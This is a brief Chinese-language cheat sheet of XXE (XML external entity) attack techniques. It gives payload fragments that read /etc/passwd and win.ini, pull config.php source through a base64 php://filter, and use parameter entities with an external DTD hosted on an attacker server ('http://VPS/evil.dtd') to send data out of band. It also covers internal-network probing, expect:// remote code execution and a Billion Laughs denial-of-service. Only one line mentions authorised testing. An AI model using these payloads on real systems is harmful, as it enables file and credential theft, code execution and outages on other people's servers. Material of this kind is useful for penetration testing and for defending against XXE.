绕过技巧

  • 基础读文件：内部 DTD + file:///C:/Windows/win.ini（Windows）或 file:///etc/passwd（Linux）。
  • 源码编码读取：php://filter/read=convert.base64-encode/resource=config.php，避开 < 破坏 XML 结构。
  • 参数实体：内容里无法直接声明时用 <!ENTITY % file SYSTEM "..."> %file;，配合外部 DTD 完成 OOB 数据外带。
  • 外部 DTD：实体声明放到自己服务器的 evil.dtd，目标仅加载 <!ENTITY % dtd SYSTEM "http://VPS/evil.dtd">，常用于无回显 XXE。
  • 协议变形：除 file:// 外还可 http://（探测内网）、php://、expect://（特定环境 RCE）。
  • Billion Laughs（炸弹）：多层实体嵌套指数展开造成 DoS，授权测试时才可验证。
